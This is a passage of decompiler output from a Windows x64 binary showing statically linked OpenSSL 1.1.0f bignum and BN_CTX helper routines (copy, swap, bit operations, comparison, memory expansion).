      *(_QWORD *)(*(_QWORD *)a2 + 64i64) = v32 ^ v31;
      *(_QWORD *)(*(_QWORD *)a3 + 64i64) ^= v32;
LABEL_20:
      v33 = *(_QWORD *)(*(_QWORD *)a2 + 56i64);
      v34 = v4 & (v33 ^ *(_QWORD *)(*(_QWORD *)a3 + 56i64));
      *(_QWORD *)(*(_QWORD *)a2 + 56i64) = v34 ^ v33;
      *(_QWORD *)(*(_QWORD *)a3 + 56i64) ^= v34;
LABEL_21:
      v35 = *(_QWORD *)(*(_QWORD *)a2 + 48i64);
      v36 = v4 & (v35 ^ *(_QWORD *)(*(_QWORD *)a3 + 48i64));
      *(_QWORD *)(*(_QWORD *)a2 + 48i64) = v36 ^ v35;
      *(_QWORD *)(*(_QWORD *)a3 + 48i64) ^= v36;
LABEL_22:
      v37 = *(_QWORD *)(*(_QWORD *)a2 + 40i64);
      v38 = v4 & (v37 ^ *(_QWORD *)(*(_QWORD *)a3 + 40i64));
      *(_QWORD *)(*(_QWORD *)a2 + 40i64) = v38 ^ v37;
      *(_QWORD *)(*(_QWORD *)a3 + 40i64) ^= v38;
LABEL_23:
      v39 = *(_QWORD *)(*(_QWORD *)a2 + 32i64);
      v40 = v4 & (v39 ^ *(_QWORD *)(*(_QWORD *)a3 + 32i64));
      *(_QWORD *)(*(_QWORD *)a2 + 32i64) = v40 ^ v39;
      *(_QWORD *)(*(_QWORD *)a3 + 32i64) ^= v40;
LABEL_24:
      v41 = *(_QWORD *)(*(_QWORD *)a2 + 24i64);
      v42 = v4 & (v41 ^ *(_QWORD *)(*(_QWORD *)a3 + 24i64));
      *(_QWORD *)(*(_QWORD *)a2 + 24i64) = v42 ^ v41;
      *(_QWORD *)(*(_QWORD *)a3 + 24i64) ^= v42;
LABEL_25:
      v43 = *(_QWORD *)(*(_QWORD *)a2 + 16i64);
      v44 = v4 & (v43 ^ *(_QWORD *)(*(_QWORD *)a3 + 16i64));
      *(_QWORD *)(*(_QWORD *)a2 + 16i64) = v44 ^ v43;
      *(_QWORD *)(*(_QWORD *)a3 + 16i64) ^= v44;
LABEL_26:
      v45 = *(_QWORD *)(*(_QWORD *)a2 + 8i64);
      v46 = v4 & (v45 ^ *(_QWORD *)(*(_QWORD *)a3 + 8i64));
      *(_QWORD *)(*(_QWORD *)a2 + 8i64) = v46 ^ v45;
      *(_QWORD *)(*(_QWORD *)a3 + 8i64) ^= v46;
LABEL_27:
      v47 = **(_QWORD **)a2;
      v48 = v4 & (v47 ^ **(_QWORD **)a3);
      **(_QWORD **)a2 = v48 ^ v47;
      result = *(_QWORD *)a3;
      **(_QWORD **)a3 ^= v48;
      return result;
  }
}

//----- (0000000140026E90) ----------------------------------------------------
_QWORD *__fastcall sub_140026E90(__int64 a1, __int64 a2)
{
  int v4; // edx
  _QWORD *result; // rax
  __int64 *v6; // r9
  __int64 *v7; // r10
  int i; // r11d
  __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 v11; // r8
  __int64 v12; // rax

  if ( a1 == a2 )
    return (_QWORD *)a1;
  v4 = *(_DWORD *)(a2 + 8);
  if ( v4 > *(_DWORD *)(a1 + 12) )
    result = sub_140027910(a1, v4);
  else
    result = (_QWORD *)a1;
  if ( result )
  {
    v6 = *(__int64 **)a1;
    v7 = *(__int64 **)a2;
    for ( i = *(int *)(a2 + 8) >> 2; i > 0; v6 += 4 )
    {
      v9 = v7[1];
      --i;
      v10 = v7[2];
      v11 = v7[3];
      v12 = *v7;
      v7 += 4;
      *v6 = v12;
      v6[1] = v9;
      v6[2] = v10;
      v6[3] = v11;
    }
    if ( (*(_DWORD *)(a2 + 8) & 3) != 1 )
    {
      if ( (*(_DWORD *)(a2 + 8) & 3) != 2 )
      {
        if ( (*(_DWORD *)(a2 + 8) & 3) != 3 )
        {
LABEL_14:
          *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
          *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
          return (_QWORD *)a1;
        }
        v6[2] = v7[2];
      }
      v6[1] = v7[1];
    }
    *v6 = *v7;
    goto LABEL_14;
  }
  return result;
}

//----- (0000000140026F70) ----------------------------------------------------
_DWORD *__fastcall sub_140026F70(__int64 a1)
{
  _DWORD *v3; // rax
  _DWORD *v4; // rbx

  if ( !a1 )
    return 0i64;
  if ( (*(_BYTE *)(a1 + 20) & 8) != 0 )
    v3 = sub_1400273B0();
  else
    v3 = sub_140027200();
  v4 = v3;
  if ( !v3 )
    return 0i64;
  if ( !sub_140026E90((__int64)v3, a1) )
  {
    sub_140026FF0(v4);
    return 0i64;
  }
  return v4;
}

//----- (0000000140026FF0) ----------------------------------------------------
void __fastcall sub_140026FF0(_DWORD *a1)
{
  int v1; // eax
  void *v3; // rcx
  int v4; // eax

  if ( a1 )
  {
    v1 = a1[5];
    if ( (v1 & 2) == 0 )
    {
      v3 = *(void **)a1;
      if ( (v1 & 8) != 0 )
        sub_140041990(v3);
      else
        sub_14001D930(v3);
    }
    v4 = a1[5];
    if ( (v4 & 1) != 0 )
    {
      sub_14001D930(a1);
    }
    else
    {
      *(_QWORD *)a1 = 0i64;
      a1[5] = v4 | 0x8000;
    }
  }
}

//----- (0000000140027070) ----------------------------------------------------
__int64 __fastcall sub_140027070(__int64 a1, unsigned int a2)
{
  return a2 & *(_DWORD *)(a1 + 20);
}

//----- (0000000140027080) ----------------------------------------------------
__int64 __fastcall sub_140027080(_DWORD *a1)
{
  int v1; // eax

  v1 = a1[2];
  if ( v1 > 1 )
    return -1i64;
  if ( v1 == 1 )
    return **(_QWORD **)a1;
  return 0i64;
}

//----- (00000001400270A0) ----------------------------------------------------
__int64 __fastcall sub_1400270A0(__int64 a1, int a2)
{
  int v5; // edx
  int v6; // ecx

  if ( a2 < 0 )
    return 0i64;
  v5 = (a2 >> 31) & 0x3F;
  v6 = (v5 + a2) >> 6;
  if ( *(_DWORD *)(a1 + 8) <= v6 )
    return 0i64;
  else
    return (*(_QWORD *)(*(_QWORD *)a1 + 8i64 * v6) >> (((v5 + a2) & 0x3Fu) - v5)) & 1i64;
}

//----- (00000001400270E0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400270E0(__int64 a1)
{
  return *(_DWORD *)(a1 + 16) != 0;
}

//----- (00000001400270F0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400270F0(__int64 a1)
{
  return *(int *)(a1 + 8) > 0 && (**(_BYTE **)a1 & 1) != 0;
}

//----- (0000000140027110) ----------------------------------------------------
_BOOL8 __fastcall sub_140027110(__int64 a1)
{
  return *(_DWORD *)(a1 + 8) == 1 && **(_QWORD **)a1 == 1i64 && !*(_DWORD *)(a1 + 16);
}

//----- (0000000140027130) ----------------------------------------------------
_BOOL8 __fastcall sub_140027130(__int64 a1, __int64 a2)
{
  int v2; // r8d

  v2 = *(_DWORD *)(a1 + 8);
  return (v2 == 1 && **(_QWORD **)a1 == a2 || !a2 && !v2) && (!a2 || !*(_DWORD *)(a1 + 16));
}

//----- (0000000140027160) ----------------------------------------------------
_BOOL8 __fastcall sub_140027160(__int64 a1)
{
  return *(_DWORD *)(a1 + 8) == 0;
}

//----- (0000000140027170) ----------------------------------------------------
__int64 __fastcall sub_140027170(__int64 a1, int a2)
{
  int v5; // edx
  int v6; // eax
  int v7; // ecx
  __int64 v8; // rdx
  __int64 v9; // r8
  bool v10; // zf

  if ( a2 < 0 )
    return 0i64;
  v5 = (a2 >> 31) & 0x3F;
  v6 = ((v5 + a2) & 0x3F) - v5;
  v7 = (v5 + a2) >> 6;
  if ( v7 >= *(_DWORD *)(a1 + 8) )
    return 0i64;
  if ( v6 )
  {
    *(_DWORD *)(a1 + 8) = v7 + 1;
    *(_QWORD *)(*(_QWORD *)a1 + 8i64 * v7) &= ~(-1i64 << v6);
  }
  else
  {
    *(_DWORD *)(a1 + 8) = v7;
  }
  v8 = *(int *)(a1 + 8);
  if ( (int)v8 > 0 )
  {
    v9 = *(_QWORD *)a1 + 8 * v8;
    do
    {
      v10 = *(_QWORD *)(v9 - 8) == 0i64;
      v9 -= 8i64;
      if ( !v10 )
        break;
      LODWORD(v8) = v8 - 1;
    }
    while ( (int)v8 > 0 );
    *(_DWORD *)(a1 + 8) = v8;
  }
  if ( !*(_DWORD *)(a1 + 8) )
    *(_DWORD *)(a1 + 16) = 0;
  return 1i64;
}

//----- (0000000140027200) ----------------------------------------------------
_DWORD *__fastcall sub_140027200()
{
  int v0; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 32));
  if ( result )
  {
    result[5] = 1;
  }
  else
  {
    sub_140024610(3, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 228);
    return 0i64;
  }
  return result;
}
// 14002721A: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140027260) ----------------------------------------------------
__int64 __fastcall sub_140027260(__int64 a1)
{
  __int64 result; // rax

  result = *(unsigned int *)(a1 + 8);
  if ( (_DWORD)result )
    return (((_DWORD)result - 1) << 6)
         + (unsigned int)sub_1400272A0(*(_QWORD *)(*(_QWORD *)a1 + 8i64 * ((int)result - 1)));
  return result;
}

//----- (00000001400272A0) ----------------------------------------------------
__int64 __fastcall sub_1400272A0(unsigned __int64 a1)
{
  if ( (a1 & 0xFFFFFFFF00000000ui64) != 0 )
  {
    if ( (a1 & 0xFFFF000000000000ui64) != 0 )
    {
      if ( (a1 & 0xFF00000000000000ui64) != 0 )
        return (unsigned int)byte_1400D7F90[HIBYTE(a1)] + 56;
      else
        return (unsigned int)byte_1400D7F90[HIWORD(a1)] + 48;
    }
    else if ( (a1 & 0xFF0000000000i64) != 0 )
    {
      return (unsigned int)byte_1400D7F90[a1 >> 40] + 40;
    }
    else
    {
      return (unsigned int)byte_1400D7F90[SHIDWORD(a1)] + 32;
    }
  }
  else if ( (a1 & 0xFFFF0000) != 0 )
  {
    if ( (a1 & 0xFF000000) != 0 )
      return (unsigned int)byte_1400D7F90[(int)(a1 >> 24)] + 24;
    else
      return (unsigned int)byte_1400D7F90[(int)(a1 >> 16)] + 16;
  }
  else if ( (a1 & 0xFF00) != 0 )
  {
    return (unsigned int)byte_1400D7F90[(int)(a1 >> 8)] + 8;
  }
  else
  {
    return byte_1400D7F90[(int)a1];
  }
}
// 1400D7F90: using guessed type unsigned __int8 byte_1400D7F90[256];

//----- (00000001400273B0) ----------------------------------------------------
_DWORD *__fastcall sub_1400273B0()
{
  int v0; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 - 32));
  if ( result )
  {
    result[5] = 9;
  }
  else
  {
    sub_140024610(3, 113, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 228);
    return 0i64;
  }
  return result;
}
// 1400273CA: variable 'v0' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140027410) ----------------------------------------------------
__int64 __fastcall sub_140027410(int a1, int a2)
{
  unsigned int v2; // ecx
  __int64 result; // rax

  if ( a1 < 15360 )
  {
    if ( a1 < 7690 )
    {
      if ( a1 < 3072 )
      {
        if ( a1 < 2048 )
        {
          if ( a1 < 1024 )
            return 0i64;
          v2 = 80;
        }
        else
        {
          v2 = 112;
        }
      }
      else
      {
        v2 = 128;
      }
    }
    else
    {
      v2 = 192;
    }
  }
  else
  {
    v2 = 256;
  }
  if ( a2 == -1 )
    return v2;
  result = (unsigned int)(a2 / 2);
  if ( (int)result < 80 )
    return 0i64;
  if ( (int)result >= (int)v2 )
    return v2;
  return result;
}

//----- (0000000140027480) ----------------------------------------------------
__int64 __fastcall sub_140027480(__int64 a1, int a2)
{
  __int64 result; // rax
  int v5; // edx
  int v6; // esi
  char v7; // bp
  int v8; // edi
  __int64 i; // rcx

  if ( a2 < 0 )
    return 0i64;
  v5 = (a2 >> 31) & 0x3F;
  v6 = (v5 + a2) >> 6;
  v7 = ((v5 + a2) & 0x3F) - v5;
  if ( *(_DWORD *)(a1 + 8) > v6 )
    goto LABEL_11;
  v8 = v6 + 1;
  if ( v6 + 1 > *(_DWORD *)(a1 + 12) )
    result = (__int64)sub_140027910(a1, v8);
  else
    result = a1;
  if ( result )
  {
    for ( i = *(int *)(a1 + 8); i < v8; ++i )
      *(_QWORD *)(*(_QWORD *)a1 + 8 * i) = 0i64;
    *(_DWORD *)(a1 + 8) = v8;
LABEL_11:
    result = 1i64;
    *(_QWORD *)(*(_QWORD *)a1 + 8i64 * v6) |= 1i64 << v7;
  }
  return result;
}

//----- (0000000140027530) ----------------------------------------------------
void __fastcall sub_140027530(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 20) |= a2;
}

//----- (0000000140027540) ----------------------------------------------------
void __fastcall sub_140027540(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 16) = a2 && *(_DWORD *)(a1 + 8);
}

//----- (0000000140027560) ----------------------------------------------------
__int64 __fastcall sub_140027560(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  _QWORD *v5; // rcx

  if ( *(int *)(a1 + 12) < 1 )
    result = (__int64)sub_140027910(a1, 1);
  else
    result = a1;
  if ( result )
  {
    v5 = *(_QWORD **)a1;
    *(_DWORD *)(a1 + 16) = 0;
    result = 1i64;
    *v5 = a2;
    *(_DWORD *)(a1 + 8) = a2 != 0;
  }
  return result;
}

//----- (00000001400275D0) ----------------------------------------------------
__int64 __fastcall sub_1400275D0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  return sub_14003CA60(a1, a2, a3 + 8, a3, a4);
}

//----- (0000000140027600) ----------------------------------------------------
__int64 __fastcall sub_140027600(__int64 *a1, __int64 *a2)
{
  int v2; // r8d
  __int64 result; // rax
  __int64 v4; // r9
  __int64 v5; // rdx
  __int64 v6; // rcx
  unsigned __int64 *v7; // rax
  __int64 v8; // r9
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // r8

  v2 = *((_DWORD *)a1 + 2);
  result = (unsigned int)(v2 - *((_DWORD *)a2 + 2));
  if ( !(_DWORD)result )
  {
    v4 = *a1;
    v5 = *a2;
    v6 = v2 - 1;
    if ( v2 - 1 < 0 )
    {
      return 0i64;
    }
    else
    {
      v7 = (unsigned __int64 *)(v5 + 8i64 * (v2 - 1));
      v8 = v4 - v5;
      while ( 1 )
      {
        v9 = *(unsigned __int64 *)((char *)v7 + v8);
        v10 = *v7;
        if ( v9 != *v7 )
          break;
        --v7;
        if ( --v6 < 0 )
          return 0i64;
      }
      result = 0xFFFFFFFFi64;
      if ( v9 > v10 )
        return 1i64;
    }
  }
  return result;
}

//----- (0000000140027650) ----------------------------------------------------
void **sub_140027650()
{
  return &off_1400D7F78;
}
// 1400D7F78: using guessed type void *off_1400D7F78;

//----- (0000000140027660) ----------------------------------------------------
__int64 __fastcall sub_140027660(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax

  *(_QWORD *)a1 = *(_QWORD *)a2;
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  *(_DWORD *)(a1 + 16) = *(_DWORD *)(a2 + 16);
  result = *(_DWORD *)(a1 + 20) & 1;
  *(_DWORD *)(a1 + 20) = a3 | result | *(_DWORD *)(a2 + 20) & 0xFFFFFFFE | 2;
  return result;
}

//----- (0000000140027690) ----------------------------------------------------
__int64 __fastcall sub_140027690(__int64 a1, _BYTE *a2, int a3)
{
  int v3; // eax
  int v7; // ebx
  size_t v9; // rdi
  int v10; // eax
  char v11; // cl

  v3 = *(_DWORD *)(a1 + 8);
  if ( v3 )
    v3 = ((v3 - 1) << 6) + sub_1400272A0(*(_QWORD *)(*(_QWORD *)a1 + 8i64 * (v3 - 1)));
  v7 = (v3 + 7) / 8;
  if ( a3 == -1 )
  {
    a3 = (v3 + 7) / 8;
  }
  else
  {
    if ( a3 < v7 )
      return 0xFFFFFFFFi64;
    if ( a3 > v7 )
    {
      v9 = a3 - v7;
      memset(a2, 0, v9);
      a2 += v9;
    }
  }
  for ( ; v7; ++a2 )
  {
    v10 = --v7;
    v11 = v7 & 7;
    if ( v7 < 0 )
    {
      v10 = v7 + 7;
      v11 -= 8;
    }
    *a2 = *(_QWORD *)(*(_QWORD *)a1 + 8i64 * (v10 >> 3)) >> (8 * v11);
  }
  return (unsigned int)a3;
}

//----- (0000000140027770) ----------------------------------------------------
__int64 __fastcall sub_140027770(__int64 a1, __int64 a2, int a3, int a4)
{
  int v4; // eax
  __int64 v6; // r8
  bool v9; // cc
  __int64 v10; // r10
  _QWORD *v11; // rdx
  __int64 v12; // rcx
  _QWORD *v13; // rdx
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // r8
  __int64 result; // rax
  __int64 v17; // rcx
  unsigned __int64 *v18; // rax
  __int64 v19; // r11

  v4 = a3 - 1;
  v6 = a3 - 1;
  v9 = a4 <= 0;
  if ( a4 >= 0 )
  {
LABEL_6:
    if ( v9 || (v12 = a4, a4 <= 0) )
    {
LABEL_11:
      v14 = *(_QWORD *)(a1 + 8 * v6);
      v15 = *(_QWORD *)(a2 + 8 * v6);
      if ( v14 == v15 )
      {
        v17 = a3 - 2;
        if ( a3 - 2 < 0 )
          return 0i64;
        v18 = (unsigned __int64 *)(a2 + 8i64 * (a3 - 2));
        v19 = a1 - a2;
        while ( 1 )
        {
          v14 = *(unsigned __int64 *)((char *)v18 + v19);
          v15 = *v18;
          if ( v14 != *v18 )
            break;
          --v18;
          if ( --v17 < 0 )
            return 0i64;
        }
      }
      result = 0xFFFFFFFFi64;
      if ( v14 > v15 )
        return 1i64;
    }
    else
    {
      v13 = (_QWORD *)(a1 + 8 * (a4 + v6));
      while ( !*v13 )
      {
        --v12;
        --v13;
        if ( v12 <= 0 )
          goto LABEL_11;
      }
      return 1i64;
    }
  }
  else
  {
    v10 = a4;
    v11 = (_QWORD *)(a2 + 8 * (v4 - (__int64)a4));
    while ( !*v11 )
    {
      --v11;
      if ( ++v10 >= 0 )
      {
        v9 = a4 <= 0;
        goto LABEL_6;
      }
    }
    return 0xFFFFFFFFi64;
  }
  return result;
}

//----- (0000000140027860) ----------------------------------------------------
__int64 __fastcall sub_140027860(__int64 a1, __int64 a2, int a3)
{
  unsigned __int64 v4; // r11
  unsigned __int64 v5; // r9
  __int64 result; // rax
  __int64 v7; // rcx
  unsigned __int64 *v8; // rax
  __int64 v9; // r10
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // r8

  v4 = *(_QWORD *)(a1 + 8i64 * (a3 - 1));
  v5 = *(_QWORD *)(a2 + 8i64 * (a3 - 1));
  if ( v4 == v5 )
  {
    v7 = a3 - 2;
    if ( a3 - 2 < 0 )
    {
      return 0i64;
    }
    else
    {
      v8 = (unsigned __int64 *)(a2 + 8i64 * (a3 - 2));
      v9 = a1 - a2;
      while ( 1 )
      {
        v10 = *(unsigned __int64 *)((char *)v8 + v9);
        v11 = *v8;
        if ( v10 != *v8 )
          break;
        --v8;
        if ( --v7 < 0 )
          return 0i64;
      }
      result = 0xFFFFFFFFi64;
      if ( v10 > v11 )
        return 1i64;
    }
  }
  else
  {
    result = 0xFFFFFFFFi64;
    if ( v4 > v5 )
      return 1i64;
  }
  return result;
}

//----- (00000001400278D0) ----------------------------------------------------
__int64 __fastcall sub_1400278D0(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // r9
  bool v3; // zf

  result = *(int *)(a1 + 8);
  if ( (int)result > 0 )
  {
    v2 = *(_QWORD *)a1 + 8 * result;
    do
    {
      v3 = *(_QWORD *)(v2 - 8) == 0i64;
      v2 -= 8i64;
      if ( !v3 )
        break;
      result = (unsigned int)(result - 1);
    }
    while ( (int)result > 0 );
    *(_DWORD *)(a1 + 8) = result;
  }
  if ( !*(_DWORD *)(a1 + 8) )
    *(_DWORD *)(a1 + 16) = 0;
  return result;
}

//----- (0000000140027910) ----------------------------------------------------
_QWORD *__fastcall sub_140027910(__int64 a1, int a2)
{
  _QWORD *result; // rax
  _QWORD *v5; // rsi
  void *v6; // rcx

  if ( a2 > *(_DWORD *)(a1 + 12) )
  {
    result = sub_1400279B0(a1, a2);
    v5 = result;
    if ( !result )
      return result;
    if ( *(_QWORD *)a1 )
    {
      sub_140023440(*(_QWORD *)a1, 8i64 * *(int *)(a1 + 12));
      v6 = *(void **)a1;
      if ( (*(_BYTE *)(a1 + 20) & 8) != 0 )
        sub_140041990(v6);
      else
        sub_14001D930(v6);
    }
    *(_QWORD *)a1 = v5;
    *(_DWORD *)(a1 + 12) = a2;
  }
  return (_QWORD *)a1;
}

//----- (00000001400279B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400279B0(__int64 a1, int a2)
{
  int v2; // eax
  int v5; // eax
  size_t v6; // rcx
  _QWORD *v7; // rax
  _QWORD *v8; // rdi
  __int64 *v9; // r9
  __int64 *v10; // r10
  int i; // r11d
  __int64 v12; // rcx
  __int64 v13; // rdx
  __int64 v14; // r8
  __int64 v15; // rax

  if ( a2 > 0x7FFFFF )
  {
    sub_140024610(v2 - 45, v2 + 72, v2 + 66, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 255);
    return 0i64;
  }
  v5 = *(_DWORD *)(a1 + 20);
  if ( (v5 & 2) != 0 )
  {
    sub_140024610(3, 120, 105, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 259);
    return 0i64;
  }
  v6 = 8i64 * a2;
  if ( (v5 & 8) != 0 )
    v7 = sub_1400419D0(v6);
  else
    v7 = sub_14001DC20(v6);
  v8 = v7;
  if ( !v7 )
  {
    sub_140024610(3, 120, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_lib.c", 267);
    return 0i64;
  }
  v9 = *(__int64 **)a1;
  if ( *(_QWORD *)a1 )
  {
    v10 = v7;
    for ( i = *(int *)(a1 + 8) >> 2; i > 0; v10 += 4 )
    {
      v12 = v9[1];
      --i;
      v13 = v9[2];
      v14 = v9[3];
      v15 = *v9;
      v9 += 4;
      *v10 = v15;
      v10[1] = v12;
      v10[2] = v13;
      v10[3] = v14;
    }
    switch ( *(_DWORD *)(a1 + 8) & 3 )
    {
      case 1:
        goto LABEL_18;
      case 2:
LABEL_17:
        v10[1] = v9[1];
LABEL_18:
        *v10 = *v9;
        return v8;
      case 3:
        v10[2] = v9[2];
        goto LABEL_17;
    }
  }
  return v8;
}
// 1400279DC: variable 'v2' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0000000140027B10) ----------------------------------------------------
void __fastcall sub_140027B10(__int64 a1)
{
  __int64 v1; // xmm1_8

  v1 = qword_140142B80;
  *(_OWORD *)a1 = xmmword_140142B70;
  *(_QWORD *)(a1 + 16) = v1;
}
// 140142B70: using guessed type __int128 xmmword_140142B70;
// 140142B80: using guessed type __int64 qword_140142B80;

//----- (0000000140027B30) ----------------------------------------------------
_QWORD *__fastcall sub_140027B30(__int64 a1, int a2)
{
  if ( a2 > *(_DWORD *)(a1 + 12) )
    return sub_140027910(a1, a2);
  else
    return (_QWORD *)a1;
}

//----- (0000000140027B60) ----------------------------------------------------
__int64 __fastcall sub_140027B60(__int64 a1)
{
  int v1; // eax
  __int64 result; // rax
  unsigned int v3; // r9d
  unsigned int v4; // r10d
  int v5; // eax
  unsigned int v6; // r9d
  char v7; // dl
  int v8; // edx

  v1 = *(_DWORD *)(a1 + 52);
  if ( v1 )
  {
    result = (unsigned int)(v1 - 1);
    *(_DWORD *)(a1 + 52) = result;
  }
  else
  {
    --*(_DWORD *)(a1 + 40);
    result = *(_QWORD *)(a1 + 32);
    v3 = *(_DWORD *)(a1 + 48);
    v4 = *(_DWORD *)(result + 4i64 * *(unsigned int *)(a1 + 40));
    if ( v4 < v3 )
    {
      v5 = *(_DWORD *)(a1 + 24);
      v6 = v3 - v4;
      v7 = v5 - 1;
      result = v5 - v6;
      v8 = v7 & 0xF;
      *(_DWORD *)(a1 + 24) = result;
      while ( v6 )
      {
        --v6;
        if ( v8 )
        {
          --v8;
        }
        else
        {
          result = *(_QWORD *)(a1 + 8);
          v8 = 15;
          *(_QWORD *)(a1 + 8) = *(_QWORD *)(result + 384);
        }
      }
    }
    *(_DWORD *)(a1 + 48) = v4;
    *(_DWORD *)(a1 + 56) = 0;
  }
  return result;
}

//----- (0000000140027BE0) ----------------------------------------------------
void __fastcall sub_140027BE0(__int64 a1)
{
  if ( a1 )
  {
    sub_14001D930(*(void **)(a1 + 32));
    *(_QWORD *)(a1 + 32) = 0i64;
    sub_140027DB0((__int64 **)a1);
    sub_14001D930((void *)a1);
  }
}

//----- (0000000140027C40) ----------------------------------------------------
_QWORD *__fastcall sub_140027C40(_DWORD *a1)
{
  _QWORD *v2; // rax
  _QWORD *v3; // rdi

  if ( a1[13] || a1[14] )
    return 0i64;
  v2 = sub_140027E40((__int64)a1, a1[15]);
  v3 = v2;
  if ( v2 )
  {
    sub_140027560((__int64)v2, 0i64);
    ++a1[12];
    return v3;
  }
  else
  {
    a1[14] = 1;
    sub_140024610(3, 116, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_ctx.c", 225);
    return 0i64;
  }
}

//----- (0000000140027CD0) ----------------------------------------------------
_QWORD *__fastcall sub_140027CD0()
{
  int v0; // eax
  _QWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 + 8));
  if ( result )
  {
    result[2] = 0i64;
    result[1] = 0i64;
    *result = 0i64;
    result[3] = 0i64;
    result[4] = 0i64;
    result[5] = 0i64;
  }
  else
  {
    sub_140024610(3, 106, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_ctx.c", 139);
    return 0i64;
  }
  return result;
}
// 140027CE8: variable 'v0' is possibly undefined

//----- (0000000140027D40) ----------------------------------------------------
__int64 __fastcall sub_140027D40(int *a1)
{
  int v1; // eax
  __int64 result; // rax

  v1 = a1[13];
  if ( v1 || a1[14] )
  {
    result = (unsigned int)(v1 + 1);
    a1[13] = result;
  }
  else
  {
    result = sub_140027F80((__int64)(a1 + 8), a1[12]);
    if ( !(_DWORD)result )
    {
      result = sub_140024610(3, 129, 109, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_ctx.c", 189);
      ++a1[13];
    }
  }
  return result;
}

//----- (0000000140027DB0) ----------------------------------------------------
__int64 *__fastcall sub_140027DB0(__int64 **a1)
{
  __int64 *v2; // rbx
  __int64 v3; // rdi
  __int64 *v4; // rax
  __int64 *result; // rax

  if ( *a1 )
  {
    do
    {
      v2 = *a1;
      v3 = 16i64;
      do
      {
        if ( *v2 )
          sub_140026A10(v2);
        v2 += 3;
        --v3;
      }
      while ( v3 );
      v4 = *a1;
      a1[1] = (__int64 *)(*a1)[49];
      sub_14001D930(v4);
      result = a1[1];
      *a1 = result;
    }
    while ( result );
  }
  return result;
}

//----- (0000000140027E40) ----------------------------------------------------
_QWORD *__fastcall sub_140027E40(__int64 a1, char a2)
{
  int v2; // r8d
  _QWORD *result; // rax
  _QWORD *v6; // rsi
  int v7; // r14d
  __int64 v8; // rbp
  __int64 v9; // rdi
  __int64 v10; // rax

  v2 = *(_DWORD *)(a1 + 24);
  if ( v2 == *(_DWORD *)(a1 + 28) )
  {
    result = sub_14001D8E0(0x190ui64);
    v6 = result;
    if ( result )
    {
      v7 = a2 & 8;
      v8 = 16i64;
      v9 = (__int64)result;
      do
      {
        sub_140027B10(v9);
        if ( v7 )
          sub_140027530(v9, 8);
        v9 += 24i64;
        --v8;
      }
      while ( v8 );
      v10 = *(_QWORD *)(a1 + 16);
      v6[49] = 0i64;
      v6[48] = v10;
      if ( *(_QWORD *)a1 )
        *(_QWORD *)(*(_QWORD *)(a1 + 16) + 392i64) = v6;
      else
        *(_QWORD *)a1 = v6;
      *(_DWORD *)(a1 + 28) += 16;
      result = v6;
      ++*(_DWORD *)(a1 + 24);
      *(_QWORD *)(a1 + 8) = v6;
      *(_QWORD *)(a1 + 16) = v6;
    }
  }
  else
  {
    if ( v2 )
    {
      if ( (v2 & 0xF) == 0 )
        *(_QWORD *)(a1 + 8) = *(_QWORD *)(*(_QWORD *)(a1 + 8) + 392i64);
    }
    else
    {
      *(_QWORD *)(a1 + 8) = *(_QWORD *)a1;
    }
    result = (_QWORD *)(*(_QWORD *)(a1 + 8) + 24i64 * (v2 & 0xF));
    *(_DWORD *)(a1 + 24) = v2 + 1;
  }
  return result;
}

//----- (0000000140027F80) ----------------------------------------------------
__int64 __fastcall sub_140027F80(__int64 a1, int a2)
{
  int v2; // eax
  unsigned int v5; // edi
  __int64 result; // rax
  void *v7; // rsi
  unsigned int v8; // eax

  v2 = *(_DWORD *)(a1 + 12);
  if ( *(_DWORD *)(a1 + 8) != v2 )
  {
LABEL_9:
    *(_DWORD *)(*(_QWORD *)a1 + 4i64 * *(unsigned int *)(a1 + 8)) = a2;
    result = 1i64;
    ++*(_DWORD *)(a1 + 8);
    return result;
  }
  if ( v2 )
    v5 = (unsigned int)(3 * v2) >> 1;
  else
    v5 = 32;
  result = (__int64)sub_14001D8E0(4i64 * v5);
  v7 = (void *)result;
  if ( result )
  {
    v8 = *(_DWORD *)(a1 + 8);
    if ( v8 )
      memmove(v7, *(const void **)a1, 4i64 * v8);
    sub_14001D930(*(void **)a1);
    *(_QWORD *)a1 = v7;
    *(_DWORD *)(a1 + 12) = v5;
    goto LABEL_9;
  }
  return result;
}

//----- (0000000140028040) ----------------------------------------------------
